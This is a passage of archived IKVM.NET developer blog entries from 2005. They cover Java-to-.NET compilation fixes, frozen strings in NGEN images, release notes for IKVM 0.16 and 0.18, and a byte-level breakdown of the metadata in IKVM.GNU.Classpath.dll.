<P>The fix was quite involved (the diff was about a thousand lines), because stub methods and field accessors need to be added to any public class that extends a non-public class or implements a non-public interface, however these stubs should not be visible to Java reflection, because that could potentially change the semantics of the code (e.g. for things like calculating the serial version UID). Additionally, while most fields should be exposed as properties (that read/write the field in the base class), constant fields need to be copied to retain their "constantness" when accessing them from another language (e.g. so that you can you&nbsp;say <CODE>case ZipFile.CENATT:</CODE> in C#). Another non-obvious consequence of these stub methods is that the stack walking code (in the security system and the code that generates the stack traces) needs to filter out these methods, because the system should function as if these methods weren't there.</P>
<P>The lesson here is that you have to be very careful when designing a class library in Java. I believe that the fields that the ZipConstants interface exposes on ZipFile, ZipEntry, etc. were actually an accident that the Sun developers failed to spot before shipping the original JDK. The general advice should be, don't have public classes extend non-public base classes and don't implement non-public interfaces on any of your public classes. Or at least have some tools in place that check for these inherited public members, to make you aware of them before shipping your library.</P>
<P>Finally, this problem doesn't occur in C#, because C# doesn't allow you to create a public class that extends a non-public base class. It does allow implementing non-public interfaces, but since interfaces can't have fields in C# that isn't a problem. An amusing note is that when you call an inherited public method (in a non-public base class) in an assembly that was generated with the broken version of ikvmc, the C# compiler will happily compile the call for you and the generated (invalid) code will again fail at runtime with a System.MethodAccessException.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/15/2005 19:09:27 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=6e2e2e90-1227-4705-96aa-924c69053ce4"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=6e2e2e90-1227-4705-96aa-924c69053ce4">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Saturday, 06 August 2005</h2></div>
<div class="newsItems"><a name="ab28aa8b7-87e3-49d7-b0aa-3cc2cb5dbac9"></a><div class="entry">
	<h3 class="entryTitle">Frozen Strings are Cool</h3>
	<div class="entryBody">
		<p>First off all, sorry for the bad pun, but I couldn't resist. Once Whidbey 
ships, one of the areas that .NET will be light years ahead of Java is the 
ability to share memory between different instances of the runtime. Microsoft 
did lots of work in Whidbey to enable sharing of memory pages (e.g. see
<a href="http://blogs.msdn.com/ricom/archive/2005/07/27/444136.aspx">Rico's post</a>). 
Sun did a little work in J2SE 5.0 to allow rt.jar to be shared across VM 
instances, but that's really not much compared with the sharing that NGEN 
enables on Whidbey.</p>
<p><b>Frozen Strings</b></p>
<p>One aspect that hasn't been written about much is the ability to pre-create 
string instances in NGENed images. What this means is that string literals are 
layed out in the <code>.data</code> section of the NGEN image exactly like they would be 
layed out when they are dynamically created by the CLR. So whenever you use a 
frozen string literal in your managed code you're simply passing around a pointer to 
static data in the NGEN image and not to an object in the GC heap. Since these 
strings live in the <code>.data</code> section of the image, the standard copy-on-write page 
sharing that the operating system uses for initialized data sections in images applies, so unless you 
modify the object somehow (more about this in a bit) all applications using that 
image will be sharing the same physical memory pages.</p>
<p>To get NGEN to create frozen strings for your string literals, you have to 
mark your assembly with the <code>
<a href="http://msdn2.microsoft.com/library/as648fb8(en-us,vs.80).aspx">StringFreezingAttribute</a></code>. 
Note that the downside of doing this is that your assembly will not be 
unloadable, because the frozen string instances that live in your image aren't 
tracked by the GC, the CLR needs to keep the image loaded for the lifetime of 
the process. </p>
<p><b>Copy-on-Write</b></p>
<p>Strings are immutable, so why did I mention modifying the object earlier? One 
obvious way to modify a string is to use unsafe (or native) code to poke inside 
the string (a really bad idea!), but there are other ways of &quot;modifying&quot; 
immutable objects. The first is to use an object as a monitor (using 
<code>
<a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/cpref/html/frlrfsystemthreadingmonitorclassentertopic.asp">Monitor.Enter</a></code> or the C# <code>lock()</code> construct) and the 
second is to get the object's identity hashcode by calling 
<code>
<a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/cpref/html/frlrfsystemruntimecompilerservicesruntimehelpersclassgethashcodetopic1.asp">System.Runtime.CompilerServices.RuntimeHelpers.GetHashCode()</a></code> or doing a non-virtual call to <code>Object.GetHashCode()</code> on the object. 
Using an object as a monitor will cause the object header to be used as a 
lightweight lock or as an index into the syncblock table that contains the 
heavyweight lock, so this can mutate the object (header). Locking on string 
literals was always a bad idea, because they're probably interned so they may be 
shared by other pieces of code that you don't know about and they can also be 
passed across AppDomain boundaries, but in Whidbey there is the additional 
(potential) cost of having to take a page fault and having to make a private 
copy of the page containing the strings object header, if the string is frozen. 
The second issue (identity hashcode) turns out not to be an issue for frozen 
strings, because NGEN pre-computes an identity hashcode for frozen strings, so 
RuntimeHelpers.GetHashCode() will simply return the value that was pre-computed 
and stored in the object header.</p>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/06/2005 18:52:03 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=b28aa8b7-87e3-49d7-b0aa-3cc2cb5dbac9"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=b28aa8b7-87e3-49d7-b0aa-3cc2cb5dbac9">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 22 July 2005</h2></div>
<div class="newsItems"><a name="a9cc91a45-20df-4b58-9fe7-f076312647aa"></a><div class="entry">
	<h3 class="entryTitle">0.18 Released</h3>
	<div class="entryBody">
		<P>I released 0.18.0.0 to <A href="http://sourceforge.net/project/showfiles.php?group_id=69637&amp;package_id=68631">SourceForge</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/22/2005 08:56:55 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=9cc91a45-20df-4b58-9fe7-f076312647aa"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=9cc91a45-20df-4b58-9fe7-f076312647aa">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 19 July 2005</h2></div>
<div class="newsItems"><a name="ae2571a45-e292-4078-9d98-2b77ca9a8a58"></a><div class="entry">
	<h3 class="entryTitle">Assembly File Size</h3>
	<div class="entryBody">
		<P>Yesterday's release candidate has a much smaller IKVM.GNU.Classpath.dll than the previous release candidate. As I noted this is due to some optimizations in the metadata. Let's look at the file size of IKVM.GNU.Classpath.dll over time: 
<P>
<TABLE border=1>
<TBODY>
<TR>
<TD><B>Date</B></TD>
<TD><B>IKVM Version</B></TD>
<TD><B>File Size (bytes)</B></TD></TR>
<TR>
<TD><A href="/default.aspx?date=2004-06-28">2004-06-28</A></TD>
<TD>0.8.0.0</TD>
<TD align=right>3,239,936</TD></TR>
<TR>
<TD><A href="/default.aspx?date=2005-01-10">2005-01-10</A></TD>
<TD>0.10.0.1</TD>
<TD align=right>7,348,224</TD></TR>
<TR>
<TD><A href="/default.aspx?date=2005-03-02">2005-03-02</A></TD>
<TD>0.12.0.0</TD>
<TD align=right>7,409,664</TD></TR>
<TR>
<TD><A href="/default.aspx?date=2005-05-07">2005-05-07</A></TD>
<TD>0.14.0.1</TD>
<TD align=right>7,483,392</TD></TR>
<TR>
<TD><A href="/default.aspx?date=2005-07-01">2005-07-01</A></TD>
<TD>0.16.0.0</TD>
<TD align=right>7,266,304</TD></TR>
<TR>
<TD><A href="/default.aspx?date=2005-07-18">2005-07-18</A></TD>
<TD>0.18.0.0</TD>
<TD align=right>6,782,976</TD></TR></TBODY></TABLE></P><BR>
<P>For reference, here's a graph that shows the growth of GNU Classpath:<BR><A style="COLOR: #66c; TEXT-DECORATION: none" href="http://object-refinery.com/classpath/statcvs/"><IMG src="http://object-refinery.com/classpath/statcvs/loc_small.png"></A></P>
<P>The big jump in size between 0.8 and 0.10 is mostly due to three reasons: 1) Long period between releases, 2) Huge growth in GNU Classpath, 3) 0.10 for the first time includes source file names and line number tables (to be able to show source files and line numbers in stack traces).</P>
<P>The size reduction in 0.16 was due to a more efficient format for the line number tables. After making this optimization in 0.16, I wanted to investigate exactly what makes up the size of IKVM.GNU.Classpath.dll, but I couldn't find any tools to analyse a managed PE file based on this criterion. So I opened the ECMA specification and hacked together some code. Here's what I found:</P>
<P>First, let's start with the size of the Java classes and resources that IKVM.GNU.Classpath.dll consists of (to have some reference):</P>
<TABLE border=1>
<TBODY>
<TR>
<TD>&nbsp;</TD>
<TD>
<P align=right><B>bytes</B></P></TD></TR>
<TR>
<TD>Classes</TD>
<TD align=right>9,694,349</TD></TR>
<TR>
<TD>Resources</TD>
<TD align=right>2,016,851</TD></TR>
<TR>
<TD>Total</TD>
<TD align=right>11,711,200</TD></TR>
<TR>
<TD>Zipped</TD>
<TD align=right>5,843,852</TD></TR></TBODY></TABLE>
<P><BR>So, compared with the uncompressed size of the classes and resources, the size of IKVM.GNU.Classpath.dll isn't too bad at all.</P>
<P>Here's a breakdown of the parts of the PE file structure:</P>
<TABLE border=1>
<TBODY>
<TR>
<TD>&nbsp;</TD>
<TD align=right><B>bytes</B></TD></TR>
<TR>
<TD>PE Headers/overhead</TD>
<TD align=right>4,096</TD></TR>
<TR>
<TD>.text section</TD>
<TD align=right>6,770,688</TD></TR>
<TR>
<TD>.rsrc section</TD>
<TD align=right>4,096</TD></TR>
<TR>
<TD>.reloc section</TD>
<TD align=right>4,096</TD></TR></TBODY></TABLE>
<P><BR>Not very interesting, except maybe that there is a .reloc section that I don't understand the need for, since there's only managed code in this module.</P>
<P>A little more interesting is a breakdown of the .text section:</P>
<TABLE border=1>
<TBODY>
<TR>
<TD>&nbsp;</TD>
<TD align=right><B>bytes</B></TD></TR>
<TR>
<TD>Unknown</TD>
<TD align=right>8</TD></TR>
<TR>
<TD>CLI Header</TD>
<TD align=right>72</TD></TR>
<TR>
<TD>Code + resources</TD>
<TD align=right>3,651,236</TD></TR>
<TR>
<TD>Managed metadata</TD>
<TD align=right>3,116,284</TD></TR>
<TR>
<TD>Filler (alignment)</TD>
<TD align=right>3,088</TD></TR></TBODY></TABLE>
<P><BR>Here's a breakdown of the managed metadata:</P>
<TABLE border=1>
<TBODY>
<TR>
<TD>&nbsp;</TD>
<TD align=right><B>bytes</B></TD></TR>
<TR>
<TD>Metadata Header</TD>
<TD align=right>32</TD></TR>
<TR>
<TD>#~ header</TD>
<TD align=right>12</TD></TR>
<TR>
<TD>#Strings header</TD>
<TD align=right>20</TD></TR>
<TR>
<TD>#US header</TD>
<TD align=right>12</TD></TR>
<TR>
<TD>#GUID header</TD>
<TD align=right>16</TD></TR>
<TR>
<TD>#Blob header</TD>
<TD align=right>16</TD></TR>
<TR>
<TD>#~ stream</TD>
<TD align=right>1,704,068</TD></TR>
<TR>
<TD>String heap</TD>
<TD align=right>356,048</TD></TR>
<TR>
<TD>Userstring heap</TD>
<TD align=right>327,652</TD></TR>
<TR>
<TD>GUID heap</TD>
<TD align=right>16</TD></TR>
<TR>
<TD>Blob heap</TD>
<TD align=right>728,392</TD></TR></TBODY></TABLE>
<P><BR>And finally, a breakdown of the #~ stream:</P>
<TABLE border=1>
<TBODY>
<TR>
<TD>&nbsp;</TD>
<TD align=right><B>bytes</B></TD></TR>
<TR>
<TD>Header</TD>
<TD align=right>112</TD></TR>
<TR>
<TD>Module table</TD>
<TD align=right>12</TD></TR>
<TR>
<TD>TypeRef table</TD>
<TD align=right>2,210</TD></TR>
<TR>
<TD>TypeDef table</TD>
<TD align=right>79,146</TD></TR>
<TR>
<TD>Field table</TD>
<TD align=right>148,620</TD></TR>
<TR>
<TD>Method table</TD>
<TD align=right>669,870</TD></TR>
<TR>
<TD>Param table</TD>
<TD align=right>220,448</TD></TR>
<TR>
<TD>InterfaceImpl table</TD>
<TD align=right>9,472</TD></TR>
<TR>
<TD>MemberRef table</TD>
<TD align=right>5,424</TD></TR>
<TR>
<TD>Constant table</TD>
<TD align=right>47,370</TD></TR>
<TR>
<TD>CustomAttribute table</TD>
<TD align=right>488,676</TD></TR>
<TR>
<TD>StandAloneSig table</TD>
<TD align=right>24,216</TD></TR>
<TR>
<TD>PropertyMap table</TD>
<TD align=right>8</TD></TR>
<TR>
<TD>Property table</TD>
<TD align=right>90</TD></TR>
<TR>
<TD>MethodSemantics table</TD>
<TD align=right>66</TD></TR>
<TR>
<TD>MethodImpl table</TD>
<TD align=right>600</TD></TR>
<TR>
<TD>ModuleRef table</TD>
<TD align=right>8</TD></TR>
<TR>
<TD>TypeSpec table</TD>
<TD align=right>400</TD></TR>
<TR>
<TD>ImplMap table</TD>
<TD align=right>108</TD></TR>
<TR>
<TD>Assembly table</TD>
<TD align=right>28</TD></TR>
<TR>
<TD>AssemblyRef table</TD>
<TD align=right>112</TD></TR>
<TR>
<TD>ManifestResource table</TD>
<TD align=right>3,654</TD></TR>
<TR>
<TD>NestedClass table</TD>
<TD align=right>3,416</TD></TR>
<TR>
<TD>Filler (alignment)</TD>
<TD align=right>2</TD></TR></TBODY></TABLE>
<P><BR>For those unfamiliar with the CLI metadata specification, these tables contain fixed length records and the fields in the records typically contain flags, indexes into other tables or pointers into a string, userstring or blob heap, or an offset into the Code + resources part of the .text section.</P>
<P>From the above table It should be obvious that the custom attributes contribute a significant part of the file size (and remember, this is the 0.18 version of IKVM.GNU.Classpath.dll that has already been optimized quite a bit).</P>
<P>In my analysis tool I built specific code to look at the sizes of the custom attributes and here's the report it generated:</P>
<P><PRE>Custom Attributes
-----------------
Total Blob Bytes:  527670
Total Table Bytes: 488676

Type         Constructor
----         -----------
0x0000000B   IKVM.Attributes.SourceFileAttribute::.ctor(20 01 01 0E ( ...))
0x00000013   IKVM.Attributes.JavaModuleAttribute::.ctor(20 00 01 ( ..))
0x0000001B   IKVM.Attributes.RemappedTypeAttribute::.ctor(20 01 01 12 15 ( ....))
0x00000023   IKVM.Attributes.ModifiersAttribute::.ctor(20 01 01 11 1D ( ....))
0x0000002B   IKVM.Attributes.GhostInterfaceAttribute::.ctor(20 00 01 ( ..))
0x00000033   IKVM.Attributes.HideFromJavaAttribute::.ctor(20 00 01 ( ..))
0x0000003B   IKVM.Attributes.ImplementsAttribute::.ctor(20 01 01 1D 0E ( ....))
0x00000043   System.ThreadStaticAttribute::.ctor(20 00 01 ( ..))
0x0000004B   System.ObsoleteAttribute::.ctor(20 00 01 ( ..))
0x00000053   IKVM.Attributes.InnerClassAttribute::.ctor(20 02 01 0E 11 1D ( .....))
0x0000005B   IKVM.Attributes.ExceptionIsUnsafeForMappingAttribute::.ctor(20 00 01 ( ..))
0x00000063   System.ComponentModel.EditorBrowsableAttribute::.ctor(20 01 01 11 80 FD ( .....))
0x0000006B   IKVM.Attributes.NameSigAttribute::.ctor(20 02 01 0E 0E ( ....))
0x00000073   IKVM.Attributes.ThrowsAttribute::.ctor(20 01 01 1D 0E ( ....))
0x0000007B   IKVM.Attributes.RemappedInterfaceMethodAttribute::.ctor(20 02 01 0E 0E ( ....))
0x0000010B   IKVM.Attributes.LineNumberTableAttribute::.ctor(20 01 01 1D 05 ( ....))
0x0000023B   IKVM.Attributes.MirandaMethodAttribute::.ctor(20 00 01 ( ..))
0x000008A3   IKVM.Attributes.ConstantValueAttribute::.ctor(20 01 01 08 ( ...))
0x00000DFB   System.Diagnostics.DebuggableAttribute::.ctor(20 02 01 02 02 ( ....))
0x00000E03   IKVM.Attributes.RemappedClassAttribute::.ctor(20 02 01 0E 12 15 ( .....))
0x00000E0B   System.Reflection.AssemblyCompanyAttribute::.ctor(20 01 01 0E ( ...))
0x00000E13   System.Reflection.AssemblyCopyrightAttribute::.ctor(20 01 01 0E ( ...))
0x00000E1B   System.Reflection.AssemblyTitleAttribute::.ctor(20 01 01 0E ( ...))
0x00000E23   System.Reflection.AssemblyProductAttribute::.ctor(20 01 01 0E ( ...))

Type            Count  Blob Bytes  Total Bytes
----            -----  ----------  -----------
0x0000000B        917        7522        18526
0x00000013          1           5           17
0x0000001B          4         404          452
0x00000023        390         140         4820
0x0000002B          3           0           36
0x00000033        593           0         7116
0x0000003B       1785       33923        55343
0x00000043          6           0           72
0x0000004B        389           0         4668
0x00000053        776        3689        13001
0x0000005B         42           1          505
0x00000063         68           9          825
0x0000006B         89        2982         4050
0x00000073       5657       22069        89953
0x0000007B          1          25           37
0x0000010B      29864      456058       814426
0x0000023B        128           0         1536
0x000008A3          1           9           21
0x00000DFB          1           7           19
0x00000E03          4         479          527
0x00000E0B          1          21           33
0x00000E13          1         272          284
0x00000E1B          1          41           53
0x00000E23          1          14           26
</PRE>
<P>For comparison, here's the same table for the 0.16 version:</P><PRE>Custom Attributes
-----------------
Total Blob Bytes:  638882
Total Table Bytes: 631896

Type         Constructor
----         -----------
0x0000000B   IKVM.Attributes.JavaModuleAttribute::.ctor(20 00 01 ( ..))
0x00000013   IKVM.Attributes.SourceFileAttribute::.ctor(20 01 01 0E ( ...))
0x0000001B   IKVM.Attributes.RemappedTypeAttribute::.ctor(20 01 01 12 15 ( ....))
0x00000023   IKVM.Attributes.ModifiersAttribute::.ctor(20 01 01 11 1D ( ....))
0x0000002B   IKVM.Attributes.GhostInterfaceAttribute::.ctor(20 00 01 ( ..))
0x00000033   IKVM.Attributes.HideFromJavaAttribute::.ctor(20 00 01 ( ..))
0x0000003B   IKVM.Attributes.ImplementsAttribute::.ctor(20 01 01 1D 0E ( ....))
0x00000043   System.ThreadStaticAttribute::.ctor(20 00 01 ( ..))
0x0000004B   System.ObsoleteAttribute::.ctor(20 00 01 ( ..))
0x00000053   IKVM.Attributes.InnerClassAttribute::.ctor(20 04 01 0E 0E 0E 11 1D ( .......))
0x0000005B   IKVM.Attributes.ExceptionIsUnsafeForMappingAttribute::.ctor(20 00 01 ( ..))
0x00000063   System.ComponentModel.EditorBrowsableAttribute::.ctor(20 01 01 11 80 FD ( .....))
0x0000006B   IKVM.Attributes.NameSigAttribute::.ctor(20 02 01 0E 0E ( ....))
0x00000073   IKVM.Attributes.ThrowsAttribute::.ctor(20 01 01 1D 0E ( ....))
0x0000007B   IKVM.Attributes.RemappedInterfaceMethodAttribute::.ctor(20 02 01 0E 0E ( ....))
0x0000010B   IKVM.Attributes.LineNumberTableAttribute::.ctor(20 01 01 1D 05 ( ....))
0x00000233   IKVM.Attributes.MirandaMethodAttribute::.ctor(20 00 01 ( ..))
0x000008A3   IKVM.Attributes.ConstantValueAttribute::.ctor(20 01 01 08 ( ...))
0x00000DFB   System.Diagnostics.DebuggableAttribute::.ctor(20 02 01 02 02 ( ....))
0x00000E03   IKVM.Attributes.RemappedClassAttribute::.ctor(20 02 01 0E 12 15 ( .....))
0x00000E0B   System.Reflection.AssemblyCompanyAttribute::.ctor(20 01 01 0E ( ...))
0x00000E13   System.Reflection.AssemblyCopyrightAttribute::.ctor(20 01 01 0E ( ...))
0x00000E1B   System.Reflection.AssemblyTitleAttribute::.ctor(20 01 01 0E ( ...))
0x00000E23   System.Reflection.AssemblyProductAttribute::.ctor(20 01 01 0E ( ...))

Type            Count  Blob Bytes  Total Bytes
----            -----  ----------  -----------
0x0000000B          1           5           17
0x00000013       4216       82327       132919
0x0000001B          4         404          452
0x00000023       5829         224        70172
0x0000002B          3           0           36
0x00000033       3209           0        38508
0x0000003B       1775       33852        55152
0x00000043          6           0           72
0x0000004B        389           0         4668
0x00000053        766       78090        87282
0x0000005B         42           1          505
0x00000063         68           9          825
0x0000006B         89        2982         4050
0x00000073       5650       22069        89869
0x0000007B          1          25           37
0x0000010B      30469      418060       783688
0x00000233        131           0         1572
0x000008A3          1           0           12
0x00000DFB          1           7           19
0x00000E03          4         479          527
0x00000E0B          1          21           33
0x00000E13          1         272          284
0x00000E1B          1          41           53
0x00000E23          1          14           26
</PRE>
<P>One notable item is that the line number tables have grown in 0.18, this is due to the fact that 0.18 has been compiled with the Eclipse Java Compiler whereas 0.16 was compiled with Jikes. For some reason, the Eclipse compiler generates larger line number tables. I haven't investigated this yet.</P>
<P>The new -strictfinalfieldsemantics ikvmc option was the direct result of studying the impact of metadata on the file size. Without this option, <CODE>public</CODE> and <CODE>protected final</CODE> fields are converted into readonly properties and the field requires and additional attribute. With the option, <CODE>final</CODE> fields are converted into <CODE>initonly</CODE> fields, which has the same semantics under a strict interpretation of the 1.5 VM specification. This option alone saves 155,648 bytes.</P>
<P>Looking at the custom attribute sizes, there appears to be more room for improvement. In particular, the ThrowsAttribute, InnerClassAttribute and ImplementsAttribute can benefit from using tokens instead of encoding the class names in the constructor blob, but the required APIs to resolve tokens are new in Whidbey, so for the time being that isn't an option.</P>
<P>Another long term improvement would be to include the line number tables in the method IL (or after the IL), to save on the records in the custom attribute table (which contribute a very significant 358,368 bytes). This would probably be possible in Whidbey by using <CODE>MethodBody.GetILAsByteArray()</CODE>, but it would be nicer if the ECMA spec would be extended to support this directly (it would also remove the need for the ridiculously large PDB files simply to get line numbers in stack traces for other .NET applications).</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/19/2005 11:06:52 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=e2571a45-e292-4078-9d98-2b77ca9a8a58"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=e2571a45-e292-4078-9d98-2b77ca9a8a58">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 18 July 2005</h2></div>
<div class="newsItems"><a name="ad2d74660-761c-4f5e-bf55-9d55c0cb9830"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.18 rc1</h3>
	<div class="entryBody">
		<P>The previous release candidate 0.16 rc1 never actually made it to release because of a GNU Classpath showstopper bug. Thanks to Mark Wielaard for working hard to quickly do a follow up GNU Classpath release that fixes the problem and includes a number of other improvements. I haven't made many changes to IKVM in the mean time, the only major one being that I focussed some effort on reducing the size of the metadata of IKVM.GNU.Classpath (and as a side effect for most other ikvmc generated assemblies as well). I also switched to the Eclipse Java Compiler&nbsp; because Jikes generates code that is incompatible with the new -strictfinalfieldsemantics ikvmc option.</P>
<P>Update japi results are available <A href="http://www.frijters.net/ikvm-japi-status.html">here</A>.</P>
<P>Changes:</P>
<UL>
<LI>Integrated <A href="ftp://ftp.gnu.org/pub/gnu/classpath/classpath-0.17.tar.gz">GNU Classpath 0.17</A>.</LI>
<LI>Switched to the Eclipse Java Compiler for compiling GNU Classpath (not just the generics branch).</LI>
<LI>Added optimization to only store source file name is the name differs from the class name + ".java"</LI>
<LI>Simplified and optimized inner class attribute metadata.</LI>
<LI>Added -strictfinalfieldsemantics option to ikvmc to generate more efficient (and 1.5 spec compliant) code. Note that this is not enabled by default for maximum compatibility with the Sun JVM (which isn't compliant with the 1.5 spec).</LI>
<LI>Rely less on HideFromJavaAttribute and more on naming conventions to use less metadata.</LI>
<LI>Changed ikvm.exe to ignore common -X options that java.exe supports.</LI>
<LI>Changed java.version system property to 1.4.1 to support Eclipse 3.1.</LI>
<LI>Added GNU Classpath version to ikvm.exe -version output.</LI></UL>
<P>Files are available here: <A href="http://www.frijters.net/ikvm-0.18.0.0.zip">ikvm-0.18.0.0.zip</A> (sources + binaries), <A href="http://www.frijters.net/ikvmbin-0.18.0.0.zip">ikvmbin-0.18.0.0.zip</A> (binaries)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/18/2005 10:09:06 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=d2d74660-761c-4f5e-bf55-9d55c0cb9830"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=d2d74660-761c-4f5e-bf55-9d55c0cb9830">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 01 July 2005</h2></div>
<div class="newsItems"><a name="a3a100c5e-f4b1-472d-8dcf-79d0bf0ccde1"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.16 rc1</h3>
	<div class="entryBody">
		<P>GNU Classpath 0.16 was released yesterday, so I've made a new IKVM release based on it. An interesting new feature in this release is that you can now debug dynamically loaded Java classes in the June CTP of Visual Studio 2005. Note that this only works if you start your application in the Visual Studio debugger (at startup the IKVM runtime checks System.Diagnostics.Debugger.IsAttached to determine if it should emit debugging information or not).</P>
<P>Update japi results are available <A href="http://www.frijters.net/ikvm-japi-status.html">here</A>.</P>
<P>Changes:</P>
<UL>
<LI>Integrated <A href="ftp://ftp.gnu.org/pub/gnu/classpath/classpath-0.16.tar.gz">GNU Classpath 0.16</A>.</LI>
<LI>Fixed GC race condition for remapped exceptions (introduced in previous snapshot).</LI>
<LI>Added support for naming method/constructor parameters in map.xml.</LI>
<LI>Added support for attaching attributes to parameters in map.xml.</LI>
<LI>Named all method/constructor parameters in map.xml.</LI>
<LI>Changed ExceptionHelper.readObject to not convert ClassNotFoundException into IOException.</LI>
<LI>Named parameters for Cast, CastArray, IsInstance and IsInstanceArray methods in ghost structures.</LI>
<LI>Removed support for "deprecated" attribute in map.xml. Marking methods deprecated in map.xml can now be done by applying the System.ObsoleteAttribute attribute.</LI>
<LI>Removed support for "hidefromjava" attribute in map.xml. Marking methods HideFromJava in map.xml can now be done by applying the IKVM.Attributes.HideFromJavaAttribute attribute.</LI>
<LI>Instancehelper methods on java.lang.String are no longer EditorBrowable(Never).</LI>
<LI>Only emit method parameter names for public/protected methods in public types.</LI>
<LI>Interface methods and methods that don't have debug info now get synthesized parameter names.</LI>
<LI>A couple of "random" awt fixes.</LI>
<LI>Added support for P/Invoke (DllImportAttribute).</LI>
<LI>Moved ikvmc specific compiler support to AotTypeWrapper class.</LI>
<LI>Fixed member access checks (for real this time).</LI>
<LI>Moved native methods of FileChannelImpl and MappedByteBufferImpl from IKVM.Runtime to IKVM.GNU.Classpath (using P/Invoke from Java).</LI>
<LI>Added -fileversion option to ikvmc to set the unmanaged file version.</LI>
<LI>Added call to AssemblyBuilder.DefineVersionInfoResource() to ikvmc, so that a version info resource is now automatically created (the contents are based on the various assembly attributes and the -version and -fileversion options).</LI>
<LI>Fixed possible (but unlikely) NullReferenceException in ClassLoaderWrapper.FinishAll() when it encounters a type that cannot be finished for some reason.</LI>
<LI>Made the line number table encoding a little more efficient.</LI>
<LI>Changed build process to support building the GNU Classpath generics branch (in addition to the main branch).</LI>
<LI>Added a hack to ikvmstub to export generic type instantiations. This enables a usable mscorlib.jar to be generated from the 2.0 version of mscorlib.dll.</LI>
<LI>Implement reversible name mangling for .NET type names (to handle generic type instantiations).</LI>
<LI>Fixed name mangling for delegate inner classes.</LI>
<LI>Set DebuggableAttribute to assembly before creating the module, to make sure Visual Studio (Whidbey) picks up the attribute when debugging dynamically generated code.<BR>Fixed possible System.ArgumentException in Class.forName() (when trying to load a class with a name that is invalid in .NET)</LI>
<LI>Fixed JNI_GetCreatedJavaVMs to accept null pointer for nVMs.</LI>
<LI>Fixed class name in error message for VerifyError that occurs when overriding a final method.</LI>
<LI>Added workaround to make dynamic debugging work in Whidbey June CTP.</LI></UL>
<P>Files are available here: <A href="http://www.frijters.net/ikvm-0.16.0.0.zip">ikvm-0.16.0.0.zip</A> (sources + binaries), <A href="http://www.frijters.net/ikvmbin-0.16.0.0.zip">ikvmbin-0.16.0.0.zip</A> (binaries)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/01/2005 12:47:52 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=3a100c5e-f4b1-472d-8dcf-79d0bf0ccde1"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=3a100c5e-f4b1-472d-8dcf-79d0bf0ccde1">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 29 June 2005</h2></div>
<div class="newsItems"><a name="abbeabf7e-75e6-45fb-93c1-40f7556a2454"></a><div class="entry">
	<h3 class="entryTitle">The Eclipse Java Compiler</h3>
	<div class="entryBody">
		<P>For the past three years I've been using the Jikes compiler to build GNU Classpath, but unfortunately Jikes development isn't very active anymore. I wanted to start playing with the GNU Classpath generics branch (the branch that contains the classes that require 1.5 specific language features), so I needed a compiler that could compile the generics branch and was freely available. The Eclipse Java Compiler was the obvious choice and while I ran into two bugs when I tried to compile the generics branch, the bugs were fixed within hours after I filed them, that kind of responsiveness is confidence inspiring.</P>
